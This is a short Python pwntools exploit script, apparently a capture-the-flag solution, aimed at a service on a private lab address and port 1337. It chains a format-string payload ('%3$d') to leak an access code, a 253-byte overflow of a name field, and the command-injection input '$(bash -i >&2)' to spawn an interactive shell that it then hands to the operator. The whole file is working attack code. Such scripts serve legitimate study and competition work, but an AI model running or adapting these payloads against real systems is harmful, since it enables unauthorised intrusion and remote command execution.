#!/usr/bin/python3
from pwn import remote

shell = remote("192.168.100.64", 1337)

shell.recvuntil(b"CODE: ")
shell.sendline(b"%3$d")
shell.recvuntil(b"CODE: ")

code = shell.recvline().strip()
shell.sendline(code)

shell.recvuntil(b"COMMAND: ")
shell.sendline(b"3")
shell.recvuntil(b"NAME: ")
shell.sendline(b"Y" * 253)

shell.recvuntil(b"COMMAND: ")
shell.sendline(b"1")

shell.recvuntil(b"LINE:")
shell.sendline(b"$(bash -i >&2)")

shell.recvuntil(b"shell")
shell.recvline()
shell.interactive("")
